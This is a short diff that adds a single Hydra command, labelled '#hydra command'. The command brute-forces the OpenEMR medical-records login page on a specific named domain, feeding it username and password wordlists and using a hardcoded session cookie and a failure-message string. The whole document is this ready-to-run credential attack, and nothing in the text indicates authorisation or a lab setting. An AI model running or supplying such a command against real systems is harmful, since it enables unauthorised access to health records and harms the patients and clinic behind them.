@@ -1,0 +1,2 @@
+#hydra command
+hydra emr.fortiseahk.com http-form-get "/interface/login/login.php:authUser=^USER^&clearPass=^PASS^&Login=login-button:F=Invalid username or password:H=Cookie:OpenEMR=8trYdq%2CH2Admfu0ZAwnB7gmr9uwgIYQyK918uu66Uds%2Cg5T7" -L username.txt -P password.txt
